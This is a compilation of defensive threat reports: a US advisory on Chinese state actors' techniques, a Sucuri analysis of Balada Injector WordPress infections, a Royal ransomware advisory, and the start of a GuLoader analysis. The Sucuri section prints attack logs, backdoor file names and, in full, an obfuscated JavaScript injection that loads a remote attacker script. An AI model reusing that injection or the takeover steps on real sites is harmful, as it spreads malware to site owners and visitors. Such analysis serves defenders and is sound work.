• Ensure proper network segmentation is followed to protect critical servers and devices to help mitigate potential exploitation. 
[D3-CAA] Isolate: Network Isolation Inbound Traffic Filtering [D3-ITF] Remote System Discovery
[T1018] Chinese state-sponsored cyber actors have been observed using Base-64 encoded commands, including ping, net group, and net user to enumerate target network information. 
Monitor for processes that can be used to discover remote systems, such as ping.exe and tracert.exe, especially when executed in quick succession. 
[D3-PSA] User Behavior Analysis Job Function Access Pattern Analysis
[D3-JFAPA] Tactics: Lateral Movement
[TA0008] Table X: Chinese state-sponsored cyber actors’ Lateral Movement TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) 
Detection and Mitigation Recommendations Defensive Tactics and Techniques Exploitation of Remote Services [T1210] Chinese state-sponsored cyber actors used valid accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, RDP, and Virtual Network Computing (VNC).
The actor may then perform actions as the logged-on user. 
Chinese state-sponsored cyber actors also used on-premises Identity and Access Management (IdAM) and federation services in hybrid cloud environments in order to pivot to cloud resources. 
Chinese state-sponsored cyber actors used valid accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, RDP, and Virtual Network Computing (VNC).
Disable or remove unnecessary services. 
Minimize permissions and access for service accounts. 
Perform vulnerability scanning and update software regularly. 
Use threat intelligence and open-source exploitation databases to determine services that are targets for exploitation. 
Detect: Network Traffic Analysis Remote Terminal Session Detection
[D3-RTSD] User Behavior Analysis [D3-UBA] Isolate: Execution Isolation Mandatory Access Control [D3-MAC] Tactics:
Collection [TA0009] Table XI: Chinese state-sponsored cyber actors’ Collection TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Archive Collected Data [T1560] Chinese state-sponsored cyber actors used compression and encryption of exfiltration files into RAR archives, and subsequently utilizing cloud storage services for storage. 
Scan systems to identify unauthorized archival utilities or methods unusual for the environment. 
Monitor command-line arguments for known archival utilities that are not common in the organization's environment. 
Detect: Process Analysis File Access Pattern Analysis
[D3-FAPA] Process Spawn Analysis [D3-PSA] Isolate: Execution Isolation Executable Denylisting [D3-EDL] Clipboard Data [T1115] Chinese state-sponsored cyber actors used RDP and execute rdpclip.exe to exfiltrate information from the clipboard. 
Access to the clipboard is a legitimate function of many applications on an operating system.
If an organization chooses to monitor for this behavior, then the data will likely need to be correlated against other suspicious or non-user-driven activity (e.g. excessive use of pbcopy/pbpaste (Linux) or clip.exe (Windows) run by general users through command line). 
If possible, disable use of RDP and other file sharing protocols to minimize a malicious actor's ability to exfiltrate data. 
Detect: Network Traffic Analysis Remote Terminal Session Detection [D3-RTSD] Isolate: Network Isolation Inbound Traffic Filtering [D3-ITF] Outbound Traffic Filtering [D3-OTF] Data Staged [T1074] Chinese state-sponsored cyber actors have been observed using the mv command to export files into a location, like a compromised Microsoft Exchange, IIS, or emplaced webshell prior to compressing and exfiltrating the data from the target network. 
Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as using 7-Zip, RAR, ZIP, or zlib.
Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging. 
Detect: Process Analysis File Access Pattern Analysis
[D3-FAPA] Email Collection [T1114] Chinese state-sponsored cyber actors have been observed using the New-MailboxExportRequest PowerShell cmdlet to export target email boxes. 
Audit email auto-forwarding rules for suspicious or unrecognized rulesets. 
Encrypt email using public key cryptography, where feasible. 
Use MFA on public-facing mail servers. 
Harden: 
Credential Hardening Multi-factor Authentication [D3-MFA] Message Hardening Message Encryption [D3-MENCR] Detect: Process Analysis
[D3-PA] Tactics: Command and Control
[TA0011] Table XII: Chinese state-sponsored cyber actors’ Command and Control TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Application Layer
Protocol
[T1071] Chinese state-sponsored cyber actors have been observed: Using commercial cloud storage services for command and control. 
Using malware implants that use the Dropbox:registered: API for C2 and a downloader that downloads and executes a payload using the Microsoft OneDrive:registered: API. 
Use network intrusion detection and prevention systems with network signatures to identify traffic for specific adversary malware. 
Detect: Network Traffic Analysis Client-server Payload Profiling [D3-CSPP] File Carving [D3-FC] Isolate: Network Isolation DNS Denylisting [D3-DNSDL] Ingress Tool Transfer
[T1105] Chinese state-sponsored cyber actors have been observed importing tools from GitHub or infected domains to victim networks.
In some instances.
Chinese state-sponsored cyber actors used the Server Message Block (SMB) protocol to import tools into victim networks. 
Perform ingress traffic analysis to identify transmissions that are outside of normal network behavior. 
Do not expose services and protocols (such as File Transfer Protocol
[FTP]) to the Internet without strong business justification. 
Use signature-based network intrusion detection and prevention systems to identify adversary malware coming into the network. 
Isolate: Network Isolation Inbound Traffic Filtering [D3-ITF] 
Non-Standard Port [T1571] Chinese state-sponsored cyber actors have been observed using a non-standard SSH port to establish covert communication channels with VPS infrastructure. 
Use signature-based network intrusion detection and prevention systems to identify adversary malware calling back to C2. 
Configure firewalls to limit outgoing traffic to only required ports based on the functions of that network segment. 
Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port. 
Detect: Network Traffic Analysis Client-server Payload Profiling [D3-CSPP] Protocol Metadata Anomaly Detection
[D3-PMAD] Isolate: Network Isolation Inbound Traffic Filtering [D3-ITF] Outbound Traffic Filtering [D3-OTF] Protocol Tunneling [T1572] Chinese state-sponsored cyber actors have been observed using tools like dog-tunnel and dns2tcp.exe to conceal C2 traffic with existing network activity. 
Monitor systems for connections using ports/protocols commonly associated with tunneling, such as SSH (port 22).
Also monitor for processes commonly associated with tunneling, such as Plink and the OpenSSH client. 
Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards. 
Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server) Detect: Network Traffic Analysis Protocol Metadata Anomaly Detection
[D3-PMAD] 
Proxy [T1090]: Multi-Hop Proxy [T1090.003] Chinese state-sponsored cyber actors have been observed using a network of VPSs and small office and home office (SOHO) routers as part of their operational infrastructure to evade detection and host C2 activity.
Some of these nodes operate as part of an encrypted proxy service to prevent attribution by concealing their country of origin and TTPs. 
Monitor traffic for encrypted communications originating from potentially breached routers to other routers within the organization.
Compare the source and destination with the configuration of the device to determine if these channels are authorized VPN connections or other encrypted modes of communication. 
Alert on traffic to known anonymity networks (such as Tor) or known adversary infrastructure that uses this technique. 
Use network allow and blocklists to block traffic to known anonymity networks and C2 infrastructure. 
Detect: Network Traffic Analysis Protocol Metadata Anomaly Detection
[D3-PMAD] Relay Pattern Analysis
[D3-RPA] Isolate: Network Isolation Outbound Traffic Filtering [D3-OTF] Appendix B: MITRE ATT&CK Framework Figure 2: MITRE ATT&CK Enterprise tactics and techniques used by Chinese state-sponsored cyber actors (Click here for the downloadable JSON file.) 
Contact InformationTo report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov.
When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. 
To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.dhs.gov. 
For NSA client requirements or general cybersecurity inquiries, contact the NSA Cybersecurity Requirements Center at 410-854-4200 or Cybersecurity_Requests@nsa.gov. 
Media Inquiries / Press Desk: • NSA Media Relations, 443-634-0721, MediaRelations@nsa.gov • CISA Media Relations, 703-235-2010, CISAMedia@cisa.dhs.gov • FBI National Press Office, 202-324-3691, npo@fbi.gov References [1] FireEye:
This is Not a Test: APT41 Initiates Global Intrusion Campaign Using Multiple Exploits Revisions July 19, 2021:
Initial Version This product is provided subject to this Notification and this Privacy & Use policy. 
title: Vulnerability in Essential Addons for Elementor Leads to Mass Infection url: https://blog.sucuri.net/2023/05/vulnerability-in-essential-addons-for-elementor-leads-to-mass-infection.html 
On May 11th, 2023, the very popular WordPress plugin Essential Addons for Elementor released a patch for a critical privilege escalation vulnerability, initially discovered by PatchStack.
The technical details of this vulnerability can be found on their recent blog post.
Over one million websites use this plugin and the fallout from this has been absolutely massive, with over 6,000 detections by SiteCheck already so far and 1637 detections in
publicWWW scan results.
Naturally, if you are a website owner using this plugin and haven’t yet already, patch now!
Our clients using the Sucuri Website Firewall are protected from this vulnerability as our research team issued an emergency patch shortly after the vulnerability was disclosed.
Contents:New malware taste, classic Balada flavorAs with any new vulnerability like this the attackers associated with the years-long Balada malware campaign (which we have documented extensively on this blog) were quick to jump on the opportunity.
Within 24 hours of the vulnerability’s release we observed a large spike in infections, many of which included a Doppelgänger post-layouts (Post Layouts for Gutenberg) plugin.
Notice the added “s” in posts:./wp-content/plugins/posts-layoutsSince the vulnerability allows for unauthenticated takeover of websites, attackers are able to take full administrator control of victim environments and install malicious plugins like the one above.
Post Layouts is actually a legitimate plugin found within the WordPress repository with over 30,000+ installations and is designed to add functionality to WordPress that allows posts to be displayed in grid and list layouts.
That being said, the version installed by the Balada attackers is spurious and a maliciously modified version, in which hackers disabled the legitimate functionality and added malicious code to be executed instead.
All legitimate files and the metadata of the real post-layouts plugin are retained though, which make it look like the real deal at the first sight.
We can see that with 30,000+ active installations, the original plugin has only less than 11,000 all time downloads.
Usually, the number of all time downloads is significantly higher than the number of active installations, since it’s common practice to download plugins, test them, and remove/disable afterwards.
At the beginning of this week, the number of active installations was still 20,000+.
With 316 downloads during the last 7 days, you can hardly expect the number of active installations to increase so quickly.
You can see a spike in downloads after May 12, 2023 when the attack began.
These 100+ downloads per day couldn’t contribute to the increase in active downloads and the volume of hacked sites that we see.
We think this insignificant spike was caused by webmasters and security professionals that wanted to download the official version and compare it with the suspicious plugins found on compromised sites.
The real reason of the increase in active installs is that hackers started to upload a modified version of this plugin as posts-layouts to compromised websites:We can clearly see this in the access logs of infected sites:193.169.195.64 -
[12/May/2023:21:17:33 +0000] "GET /wp-admin/plugin-install.php?wc-ajax=1" 200 0 - 16276 25453 193.169.195.64 -
[12/May/2023:21:17:36 +0000] "POST /wp-admin/update.php?action=upload-plugin&wc-ajax=1" 200 9567 - 16276 25453 193.169.195.64 -
[12/May/2023:21:17:39 +0000] "POST /wp-admin/plugin-install.php?wc-ajax=1" 200 0 - 16276 25453 193.169.195.64 -
[12/May/2023:21:17:41 +0000] "POST /wp-admin/update.php?action=upload-plugin&wc-ajax=1" 200 7689 - 16276 25453 193.169.195.64 -
[12/May/2023:21:17:45 +0000] "POST /wp-admin/plugin-install.php?wc-ajax=1" 200 0 - 16276 25453 193.169.195.64 -
[12/May/2023:21:17:48 +0000] "POST /wp-admin/update.php?action=upload-plugin&wc-ajax=1" 200 1361 - 16276 25581 … 193.169.195.64 -
[12/May/2023:21:17:55 +0000] "POST /wp-admin/plugins.php?wc-ajax=1&action=activate&plugin=posts-layouts%2Fposts-layouts.php&plugin_status=all&_wpnonce=810f12b23c" 302 0 - 16276 25581 193.169.195.64 -
[12/May/2023:21:17:56 +0000] "GET /wp-admin/plugins.php?activate=true&plugin_status=all&paged=1&s=" 200 0 - 16276 25581While the plugin is placed in a directory with a different name, all the metadata is still from the real post-layouts plugin, which confuses WordPress and they count this malicious plugin as a real one, thus inflating the number of “active installs” in the WordPress repository.
The Balada script injection occurs in the malicious posts-layout/dist/job.php file:./wp-content/plugins/posts-layouts/dist/job.phpIn the posts_layouts_head() function we can see the telltale character code obfuscation being used here, which seems to be a favorite of the Balada malware threat actors.
When decoded, the following script injection is revealed from cdn[.]scriptsplatform[.]com:<script src='hxxps://cdn[.]scriptsplatform[.]com/scripts/stats.js' type='text/javascript'></script>
The same job.php file also contains a backdoor that executes arbitrary PHP code sent as a POST request parameter “dd1”.
Additionally, we also find code used to verify the presence of the installed malicious plugin.
For requests containing the “343” GET parameter, the plugin returns the MD5 hash of ‘343’ which is equal 3ad7c2ebb96fcba7cda0cf54a2e802f5.Verification of the plugin installationHere, you can see how hackers verify the presence of the plugin before and after the infection://Before the infection a real site web page is returned: 21414 bytes 193.169.195.64 - - [12/May/2023:21:17:23 +0000] "GET /?343=1 HTTP/1.0" 200 21414 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/84.0.4147.125 Safari/537.36" … //After the infection the same request returns a short 332 byte page (including headers) 193.169.195.64 - - [12/May/2023:21:17:59 +0000] "GET /?343=1 HTTP/1.0" 200 332 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/84.0.4147.125
Safari/537.36"The malicious stats.js payload JavaScript file is, as usual, a heavily obfuscated script that looks like the following:Moreover, the WordPress wp_head hook is used within the payload, which ensures that the JavaScript injection is lodged within the header section of the website on every page.
Running a simple whois command over the main scriptsplatform domain shows that it was created/registered one day after the vulnerability was disclosed, suggesting that it was purpose-built for this mass infection:Domain name: scriptsplatform[.]com Registry Domain ID: 2780171223_DOMAIN_COM-VRSN Registrar WHOIS Server: whois.eranet.com Registrar URL: http://www.eranet.com Updated Date: 2023-05-12T00:00:00Z Creation Date: 2023-05-12T05:33:59ZVisitors to the infected websites are met with a bogus redirect served by shady ad networks pushing mainly adult dating and notification scams that can look a little something like this:Malware analysisAs you might have noticed, the malicious code added to the posts-layouts/posts-layouts.php actually tries to load three files: dist/init.php, dist/cache.php and dist/job.php.
Malicious code in wp-content/plugins/posts-layouts/posts-layouts.phpWe’ve already described the dist/job.php file above.
The dist/cache.php file is missing on all sites that we have worked on.
It doesn’t prevent the plugin from working since it only tries to load it if the file actually exists.
The dist/init.php file is a part of the legitimate post-layouts plugin.
However, in the malicious plugin the contents of the file is completely different.
It is the file that defines the posts_layouts_finish() function that is hooked to the “pre_current_active_plugins” action on the last line of the posts-layouts.php.
The purpose of this additional function is to hide the plugin from being visible from within the wp-admin administrator dashboard, but still keeps the plugin “functionality” active on the website.
Additional infection activityInstallation of the fake posts-layouts plugin is not the only thing that hackers do during the initial infection.
Additionally, they inject the Balada scripts at the top of the active theme’s header.php and footer.php files.
In the case of header.php, the injected script is hxxps://cdn.scriptsplatform[.]com/scripts/header.js.
For footer.php, the injected script is hxxps://cdn.scriptsplatform[.]com/scripts/footer.js.
This is how the injection looks in access logs:193.169.195.64 - -
[12/May/2023:21:18:00 +0000] "POST /wp-admin/theme-editor.php?wc-ajax=1&file=header.php HTTP/1.0" 200 45863 "https://<redacted>/wp-admin/theme-editor.php?wc-ajax=1&file=header.php" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0" 139.162.234.6 - - [12/May/2023:21:18:02 +0000] "GET /wp-admin/theme-editor.php?theme=<redacted>&file=header.php&wp_scrape_key=9d62c27a9d88828dc1afaa4927b0550f&wp_scrape_nonce=395126822 HTTP/1.0" 200 46029 "-" "WordPress/6.2; https://<redacted>" .. 193.169.195.64 - -
[12/May/2023:21:18:06 +0000] "POST /wp-admin/theme-editor.php?file=header.php&wc-ajax=1 HTTP/1.0" 200 45900 "https://<redacted>/wp-admin/theme-editor.php?file=header.php&wc-ajax=1" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0" 193.169.195.64 - - [12/May/2023:21:18:08 +0000] "POST /wp-admin/theme-editor.php?wc-ajax=1&file=footer.php HTTP/1.0" 200 44786 "https://<redacted>/wp-admin/theme-editor.php?wc-ajax=1&file=footer.php" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0" 139.162.234.6 - - [12/May/2023:21:18:10 +0000] "GET /wp-admin/theme-editor.php?theme=<redacted>&file=footer.php&wp_scrape_key=ad1ff4f46178f3088aa44babccd465f3&wp_scrape_nonce=1686713392 HTTP/1.0" 200 44956 "-" "WordPress/6.2; https://<redacted>" ..Malicious header.js, stat.js and footer.js loads the same code that eventually loads statistic.scriptsplatform[.]com/collect and then come.scriptsplatform[.]com/away.php which uses a TDS to redirect site visitors to some third-party site.
All three scripts appear on the same infected page.
This doesn’t cause problems, as all of them check if the statistic.scriptsplatform[.]com/collect script was actually loaded.
On the other hand, placing the scripts in three different locations helps the attackers keep the injection working even if the malware is partially cleaned.
Furthermore, we see the same attacker injecting backdoor PHP scripts into the docroot and some other directories of victim websites.
The file names of these backdoors follow the pattern wp-<English-word>-need-XXX.php, where <English-word> is a random English word and XXX are 3 random characters.
For example:./wp-sale-need-wuu.php ./wp-sold-need-xdd.php ./wp-mails-need-lxj.php ./wp-mails-need-wjo.php ./wp-drop-need-baj.php ./wp-working-need-css.php ./wp-locations-need-bot.php ./wp-readmes-need-rfq.php ./wp-track-need-ito.php ./wp-cliff-need-oxy.php ./wp-sale-need-vzw.php ./wp-working-need-bkv.php ./wp-working-need-ygr.php The contents of these files look a little something like this, with slight variations for each:When decoded, a backdoor is revealed:This backdoor executes arbitrary PHP code sent in POST request parameters.
In addition, it also tries to delete the wp-sale.js file created at the same time as the backdoor.
The wp-sale.js file contains a hash, the name of the backdoor file, and uses the ‘:demowpsale:’
keyword as a delimiter.
On each infected site the parameter names and hashes used for verifying passwords are different.
Thus, hackers need to keep track of all this data for every compromised site in order to be able to access their backdoors later.
Threat actors have also been adding a malicious user to infected websites with the name wp-demouser-44.
This username has already proliferated to many websites in google search results.
ID: 4, Username: wp-demouser-44, E-mail: wpemailFEmK@pif.com, Creation Date: 2023-05-12 11:17:30Start_h.js / start_f.js variation of Balada injectionsWhile the posts-layouts malware is found only on sites with the Essential Addons for Elementor plugin, another type of Balada injection is found on sites that don’t use the Essential Addons for Elementor — or use non-vulnerable versions of this plugin (both older than 5.4.0 and newer than 5.7.1).Most likely, this injection is leveraged when the attackers can’t obtain the WordPress admin access and use other vulnerabilities and previous backdoors instead.
In some cases, we also attribute this to cross-site contamination when multiple sites share the same hosting account.
In such cases, we find the following modified wp-blog-header.php file which includes injected obfuscated PHP code (again using character code obfuscation):The decoded malware looks like this:What we can see is the malware again tries to inject three malicious scripts:hxxps://cdn.scriptsplatform[.]com/scripts/start_h.js into the header of the bloghxxps://cdn.scriptsplatform[.]com/scripts/start_f.js into the footer of the bloghxxps://cdn.scriptsplatform[.]com/scripts/start_c.js into the main content of the blogInterestingly enough, the start_c.js script is only injected into single pages while start_f.js is injected even to known users of the blog.Start_h.js and start_c.js return the same script as the header/footer/stat.js described in the posts_layouts infection.
Start_f.js doesn’t return anything at this point, so it’s purpose it not clear.
This malware tries to track logged in WordPress users to avoid injections — even when they log out of WordPress.
To accomplish this, bad actors set the “wordpress_m_adm” cookie and write the visitors IP address into the rq.txt file in the server’s temporary directory.
Jquery injectionsIn some cases, the following obfuscated JavaScript code is injected on top of wp-includes/js/jquery/jquery.min.js and wp-includes/js/jquery/jquery-migrate.min.jsvar m=b;(function(c,e){var l=b,f=c();while(!![]){try{var g=parseInt(l(0x135))/0x1+parseInt(l(0x12b))/0x2+-parseInt(l(0x12d))/0x3+parseInt(l(0x13d))/0x4+-parseInt(l(0x12e))/0x5*(parseInt(l(0x12a))/0x6)+parseInt(l(0x12f))/0x7*(-parseInt(l(0x13e))/0x8)+parseInt(l(0x13c))/0x9;if(g===e)break;else f['push'](f['shift']());}catch(h){f['push'](f['shift']());}}}(a,0x7f054));function b(c,d){var e=a();return b=function(f,g){f=f-0x128;var h=e[f];return h;},b(c,d);}var j=document,k=j[m(0x130)](m(0x12c));k[m(0x138)]='h'+'tt'+m(0x13f)+'/'+'/s'+'ta'+m(0x128)+'t'+m(0x134)+'ri'+'p'+'ts'+m(0x132)+'tf'+'or'+m(0x13a)+m(0x136)+'lo'+'b'+'al';function a(){var n=['3558289hXnVzT','createElement','getElementsByTagName','pla','insertBefore','ics.sc','420078GNrZss','m/g','currentScript','src','head','m.co','parentNode','8887806xXCyNX','388724nuSCLw','8ZOcngi','ps:','tis','appendChild','3101916zsXWgk','1138664hDNQfV','script','1585608NAjuAN','5gMyIif'];a=function(){return n;};return a();}document[m(0x137)]?document[m(0x137)][m(0x13b)][m(0x133)](k,document[m(0x137)]):j[m(0x131)](m(0x139))[0x0][m(0x129)](k);This script also belongs to Balada Injector and loads hxxps://statistics.scriptsplatform[.]com/global.
New variation: cdn.clickandanalytics[.]comAfter May 17, 2023 we started noticing similar JavaScript injection into legitimate website files that loaded the Balada script from: hxxps://cdn.clickandanalytics[.]com/trackIt’s a very fresh domain.
According to WHOIS data, it was registered on 2023-05-17T17:01:12Z.Fake hellopress pluginPosts-layouts is not the only malicious plugin installed on sites with the vulnerable essential-addons-for-elementor-lite plugin.
Another one (which seems to be installed by a different threat actor) is hellopress.
We find these backdoors on compromised sites:wp-content/plugins/hellopress/wp_mna.php – file uploaderwp-content/plugins/hellopress/wp_filemanager.php – web shellTo summarize:The attacker successfully logs into the vulnerable WordPress site through wp-login.phpThey use the update.php?action=upload-plugin endpoint to install the malicious pluginNext, the plugin is activated via plugins.php?action=activate&plugin=posts-layouts%2Fposts-layouts.phpSeveral requests are made to both theme-editor.php and admin-ajax.php to inject further malware into the website files, specifically the header.php and footer.php files (these are further injections of the same malicious JavaScript)Further requests are made to the additional backdoor injected into the docrootThe malware is not identical for each and every affected website so the workflow and logs will vary slightly from site to site, but this is the gist of how they are exploiting this unauthenticated privilege escalation vulnerability to take over websites and inject malware.
If your website has been affected by this mass infection, of course we can help, but if you are tasked with cleaning up this malware by your lonesome be sure to follow these steps:Update all vulnerable software componentsRemove the malicious posts-layouts pluginCheck for recently modified files, including core and theme filesRemove any backdoors injected by the attackersRemove any malicious users planted by the attackersFor good measure, change all administrator passwordsWe have a more detailed guide on remediating a hacked WordPress website which you can find here.
And, as always, our free website scanning tool SiteCheck can help you confirm if the payload has been removed from your website or not:Key takeawaysTo summarise: Attackers, particularly those threat actors associated with Balada website malware, are quick to pounce on any new vulnerabilities that get disclosed or otherwise discovered.
Website owners with automatic plugin updates enabled are best protected against situations like these.
There is only a short window of time between a vulnerability disclosure and active compromise attempts, and website owners are not realistically able to manually issue patches in such short time frames in all instances.
That being said, sometimes website owners can be hesitant to issue all available plugin and theme updates due to concerns about compatibility issues or breaking something, so for this reason it’s also a good idea to place your website behind a firewall to prevent attacks.
Special thanks to Denis Sinegubko for his research and assistance with this post. 
title: #StopRansomware: Royal Ransomware url: https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a SUMMARY Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors.
These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware.
Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources. 
Actions to take today to mitigate cyber threats from ransomware: Prioritize remediating known exploited vulnerabilities. 
Train users to recognize and report phishing attempts. 
Enable and enforce multifactor authentication. 
The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint CSA to disseminate known Royal ransomware IOCs and TTPs identified through FBI threat response activities as recently as January 2023. 
Since approximately September 2022, cyber criminals have compromised U.S. and international organizations with a Royal ransomware variant.
FBI and CISA believe this variant, which uses its own custom-made file encryption program, evolved from earlier iterations that used “Zeon” as a loader.
After gaining access to victims’ networks, Royal actors disable antivirus software and exfiltrate large amounts of data before ultimately deploying the ransomware and encrypting the systems.
Royal actors have made ransom demands ranging from approximately $1 million to $11 million USD in Bitcoin.
In observed incidents, Royal actors do not include ransom amounts and payment instructions as part of the initial ransom note.
Instead, the note, which appears after encryption, requires victims to directly interact with the threat actor via a .onion URL (reachable through the Tor browser).
Royal actors have targeted numerous critical infrastructure sectors including, but not limited to, Manufacturing, Communications, Healthcare and Public Healthcare (HPH), and Education. 
FBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this CSA to reduce the likelihood and impact of ransomware incidents. 
Download the PDF version of this report: #StopRansomware: Royal Ransomware (PDF, 586.96 KB ) 
For a downloadable copy of IOCs, see AA23-061A STIX XML (XML, 114.26 KB ) TECHNICAL DETAILS Note: This advisory uses the MITRE ATT&CK:registered: for Enterprise framework, version 12.
See MITRE ATT&CK for Enterprise for all referenced tactics and techniques. 
Royal ransomware uses a unique partial encryption approach that allows the threat actor to choose a specific percentage of data in a file to encrypt.
This approach allows the actor to lower the encryption percentage for larger files, which helps evade detection.[1]
In addition to encrypting files, Royal actors also engage in double extortion tactics in which they threaten to publicly release the encrypted data if the victim does not pay the ransom. 
Initial Access Royal actors gain initial access to victim networks in a number of ways including: Phishing.
According to third-party reporting, Royal actors most commonly (in 66.7% of incidents) gain initial access to victim networks via successful phishing emails [T1566]. 
According to open-source reporting, victims have unknowingly installed malware that delivers Royal ransomware after receiving phishing emails containing malicious PDF documents [T1566.001], and malvertising [T1566.002].[2] Remote Desktop Protocol (RDP).
The second most common vector Royal actors use (in 13.3% of incidents) for initial access is RDP compromise. 
Public-facing applications.
FBI has also observed Royal actors gain initial access through exploiting public-facing applications [T1190]. Brokers.
Reports from trusted third-party sources indicate that Royal actors may leverage brokers to gain initial access and source traffic by harvesting virtual private network (VPN) credentials from stealer logs. 
Command and Control Once Royal actors gain access to the network, they communicate with command and control (C2) infrastructure and download multiple tools [T1105].
Legitimate Windows software is repurposed by Royal operators to strengthen their foothold in the victim’s network.
Ransomware operators often use open-source projects to aid their intrusion activities; Royal operators have recently been observed using Chisel, a tunneling tool transported over HTTP and secured via SSH [T1572], to communicate with their C2 infrastructure.
FBI has observed multiple Qakbot C2s used in Royal ransomware attacks, but has not yet determined if Royal ransomware exclusively uses Qakbot C2s. 
Lateral Movement and Persistence Royal actors often use RDP to move laterally across the network
[T1021.001].
Microsoft Sysinternals tool PsExec has also been used to aid lateral movement.
FBI has observed Royal actors using remote monitoring and management (RMM) software, such as AnyDesk, LogMeIn, and Atera, for persistence in the victim’s network
[T1133].
In some instances, the actors moved laterally to the domain controller.
In one confirmed case, the actors used a legitimate admin account to remotely log on to the domain controller [T1078].
Once on the domain controller, the threat actor deactivated antivirus protocols
[T1562.001] by modifying Group Policy Objects
[T1484.001]. Exfiltration Royal actors exfiltrate data from victim networks by repurposing legitimate cyber pentesting tools, such as Cobalt Strike, and malware tools and derivatives, such as Ursnif/Gozi, for data aggregation and exfiltration.
According to third-party reporting, Royal actors’ first hop in exfiltration and other operations is usually a U.S. IP address. 
Note: In reference to Cobalt Strike and other tools mentioned above, a tool repository used by Royal was identified at IP: 94.232.41[.]105 in December 2022. 
Encryption Before starting the encryption process, Royal actors: Use Windows Restart Manager to determine whether targeted files are currently in use or blocked by other applications [T1486].[1] Use Windows Volume Shadow Copy service (vssadmin.exe) to delete shadow copies to prevent system recovery.[1] FBI has found numerous batch (.bat) files on impacted systems which are typically transferred as an encrypted 7zip file.
Batch files create a new admin user [T1078.002], force a group policy update, set pertinent registry keys to auto-extract
[T1119]
and execute the ransomware, monitor the encryption process, and delete files upon completion—including Application, System, and Security event logs [T1070.001]. 
Malicious files have been found in victim networks in the following directories: C:\Temp\ C:\Users\ 
title: GuLoader VBScript Variant Returns with PowerShell Updates url: https://www.esentire.com/blog/guloader-vbscript-variant-returns-with-powershell-updates Adversaries don’t work 9-5 and neither do we.
At eSentire, our 24/7 SOCs are staffed with Elite Threat Hunters and Cyber Analysts who hunt, investigate, contain and respond to threats within minutes. 
We have discovered some of the most dangerous threats and nation state attacks in our space – including the Kaseya MSP breach and the more_eggs malware. 
Our Security Operations Centers are supported with Threat Intelligence, Tactical Threat Response and Advanced Threat Analytics driven by our Threat Response Unit – the TRU team. 
In TRU Positives, eSentire’s Threat Response Unit (TRU) provides a summary of a recent threat investigation.
We outline how we responded to the confirmed threat and what recommendations we have going forward. 
Here’s the latest from our TRU Team… What did we find? GuLoader is a sophisticated malware loader which has heavily abused tax-themed lures in the first half of 2023.
In April 2023, TRU reported on ongoing GuLoader activity using tax-themed lures and decoy files.
In the latter half of May, TRU identified an updated VBScript GuLoader variant across multiple customers. 
This blog will examine Guloader’s latest VBScript/PowerShell execution techniques in more detail. 
Similar to the previous activity, GuLoader execution begins with the user clicking on a shortcut file and launching a PowerShell command, which retrieves a decoy tax document and VBS script. 
Figure 1 Endpoint view of GuLoader’s execution chain. 
Next, PowerShell contacts two shortened links, which lead to two files hosted on softmedal[.]com (a file/image sharing site). 
The first file is infos.pdf and appears to be a real US income tax form.
The PDF is opened with the default app for PDF files (Adobe Acrobat in the above image) and displayed to the user as a decoy. 
Figure 2 US Tax Form 1040, opened and displayed to the user as a decoy.
Redactions added. 
The second file is Tefor.vbs.
Like GuLoader VBScript variants in the past, this is highly obfuscated and contains junk code to impede analysis.
The script concatenates hundreds of smaller strings into a single variable which ultimately builds and executes a PowerShell command. 
Figure 3 VBScript "Tefor.vbs".
Echoing the A1 variable to a dialogue box reveals the next stage. 
Summary of GuLoader's Execution Chain Before stepping through each step in GuLoader’s execution chain in more detail, we can summarize the entire process: Tefor.vbs VBScript is executed by the user clicking a shortcut file.
First stage PowerShell is executed by the VBScript.
BitsTransfer is used to retrieve a payload package containing the second stage PowerShell and two shellcode buffers.
Second stage PowerShell is carved out of the payload package and executed.
Shellcode A is carved from the package and reflectively loaded.
Shellcode B is decoded by Shellcode A and reflectively loaded.
Shellcode B is used to retrieve and inject Remcos RAT into a legitimate Windows process such as ieinstal.exe. 
First Stage PowerShell The PowerShell command contains various obfuscated strings, as seen in the right side of Figure 3.
These strings are passed to a de-obfuscation function (Sawmo9).
This function contains a loop that iterates over each character of the input string (excluding the first and last characters). 
In essence, it extracts every other character from the string and concatenates into a variable named $Dryde0, which is returned by the function. 
Figure 4 First stage PowerShell de-obfuscation routine. 
